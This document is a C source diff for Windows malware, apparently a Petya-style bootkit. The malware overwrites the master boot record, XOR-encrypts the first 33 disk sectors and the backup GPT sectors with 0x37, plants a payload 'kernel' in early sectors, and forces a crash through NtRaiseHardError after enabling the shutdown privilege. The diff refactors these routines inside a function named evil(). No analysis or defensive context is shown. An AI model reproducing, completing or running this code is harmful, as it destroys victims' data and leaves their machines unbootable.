@@ -9,32 +9,26 @@ uint64_t uint8to64(uint8_t fouruint8[8]) {
 		//((uint64_t)fouruint8[3] << 24) | ((uint64_t)fouruint8[2] << 16) | ((uint64_t)fouruint8[1] << 8) | ((uint64_t)fouruint8[0]);;
 }
 
-typedef NTSTATUS (WINAPI *PNTRAISE)(NTSTATUS,ULONG,ULONG,PULONG,UINT,PULONG);
-signed int hard_reboot()
+void hard_reboot() 
 {
+
 	HANDLE hProc;
-	HMODULE hMod;
-	PNTRAISE NtRaiseHardError;
-	struct _TOKEN_PRIVILEGES NewState;
-	DWORD dwRet;
 	HANDLE TokenHandle;
+	TOKEN_PRIVILEGES NewState;
 
 	hProc = GetCurrentProcess();
-	if (!OpenProcessToken(hProc, 0x28, &TokenHandle))
-	 return 0;
- 
+	OpenProcessToken(hProc, 0x28u, &TokenHandle);
 	LookupPrivilegeValueA(0, "SeShutdownPrivilege", (PLUID)NewState.Privileges);
 	NewState.PrivilegeCount = 1;
 	NewState.Privileges[0].Attributes = 2;
 
 	AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
-	if (GetLastError())
-	 return 0;
- 
-	hMod = GetModuleHandleA("NTDLL.DLL");
-	NtRaiseHardError = (PNTRAISE)GetProcAddress(hMod, "NtRaiseHardError");
-	NtRaiseHardError(0xC0000350, 0, 0, 0, 6, &dwRet);
-	return 0;
+
+	HMODULE ntdll = GetModuleHandleA("NTDLL.DLL");
+	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
+
+    	DWORD tmp;
+	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000350, 0, 0, 0, 6, &tmp);
 }
 
 void evil()
@@ -93,7 +87,7 @@ void evil()
 	int sector55 = 55*512;
 	int sector54 = 54*512;
 	int sector34 = 34*512;
-	char xor33sectors[16896];
+	char Buffer[512];
 	char sector54content[512];
 	char sector55content[512];
 	char sector57content[512];
@@ -148,10 +142,15 @@ void evil()
 		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
 		WriteFile(PhysicalDrive, NewMbr, 512, &wb, NULL);
 		SetFilePointer(PhysicalDrive, 512,0, FILE_BEGIN);
-		ReadFile(PhysicalDrive, xor33sectors, 16896, &wb, NULL);
-		for (int i = 0; i < 16896; i++)xor33sectors[i] ^= 0x37;
-		SetFilePointer(PhysicalDrive, 512,0, FILE_BEGIN);
-		WriteFile(PhysicalDrive, xor33sectors, 16896, &wb, NULL);
+		
+		for (int i = 1; i <= 33; i++)
+		{
+			ReadFile(PhysicalDrive, Buffer, 512, &wb, NULL);
+			for (int j = 0; j < 512; j++)Buffer[j] ^= 0x37;
+			SetFilePointer(PhysicalDrive, -512,0, FILE_CURRENT);
+			WriteFile(PhysicalDrive, Buffer, 512, &wb, NULL);
+		}
+		
 		SetFilePointer(PhysicalDrive, sector34,0, FILE_BEGIN);
 		WriteFile(PhysicalDrive, kernel, sizeof(kernel), &wb, NULL);
 		SetFilePointer(PhysicalDrive, sector54,0, FILE_BEGIN);
@@ -179,17 +178,22 @@ void evil()
 		memcpy(backup_lba + 0, firstLBA + 32, 8);
 
 		LARGE_INTEGER number;
-		number.QuadPart = (ULONGLONG)uint8to64(backup_lba)*(ULONGLONG)512 -32 * 512;
+		number.QuadPart = (ULONGLONG)uint8to64(backup_lba)*(ULONGLONG)512 +512;
+
+		LARGE_INTEGER move;
+		move.QuadPart = (ULONGLONG)-512;
 
 		SetFilePointerEx(PhysicalDrive, number,0, FILE_BEGIN);
 
-		ReadFile(PhysicalDrive, gpt, 16896, &wb, NULL);
-	
-		for (int i = 0; i < 16896; i++)gpt[i] ^= 0x37; //XOR with 0x37
-
-		SetFilePointerEx(PhysicalDrive, number,0, FILE_BEGIN);
-
-		WriteFile(PhysicalDrive, gpt, 16896, &wb, NULL);
+		for (int i = 1; i <= 33; i++)
+		{
+			SetFilePointerEx(PhysicalDrive, move,0, FILE_CURRENT);
+			ReadFile(PhysicalDrive, gpt, 512, &wb, NULL);
+			for (int j = 0; j < 512; j++)gpt[j] ^= 0x37;
+			SetFilePointerEx(PhysicalDrive, move,0, FILE_CURRENT);
+			WriteFile(PhysicalDrive, gpt, 512, &wb, NULL);
+			SetFilePointerEx(PhysicalDrive, move,0, FILE_CURRENT);
+		}
 
 		char special[] = {0x37, 0x37, 0x37, 0x37};
 		BYTE bootflag[] = {0x80};
@@ -223,10 +227,15 @@ void evil()
 		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
 		WriteFile(PhysicalDrive, NewMbr, 512, &wb, NULL);
 		SetFilePointer(PhysicalDrive, 512,0, FILE_BEGIN);
-		ReadFile(PhysicalDrive, xor33sectors, 16896, &wb, NULL);
-		for (int i = 0; i < 16896; i++)xor33sectors[i] ^= 0x37;
-		SetFilePointer(PhysicalDrive, 512,0, FILE_BEGIN);
-		WriteFile(PhysicalDrive, xor33sectors, 16896, &wb, NULL);
+		
+		for (int i = 1; i <= 33; i++)
+		{
+			ReadFile(PhysicalDrive, Buffer, 512, &wb, NULL);
+			for (int j = 0; j < 512; j++)Buffer[j] ^= 0x37;
+			SetFilePointer(PhysicalDrive, -512,0, FILE_CURRENT);
+			WriteFile(PhysicalDrive, Buffer, 512, &wb, NULL);
+		}
+		
 		SetFilePointer(PhysicalDrive, sector34,0, FILE_BEGIN);
 		WriteFile(PhysicalDrive, kernel, sizeof(kernel), &wb, NULL);
 		SetFilePointer(PhysicalDrive, sector54,0, FILE_BEGIN);
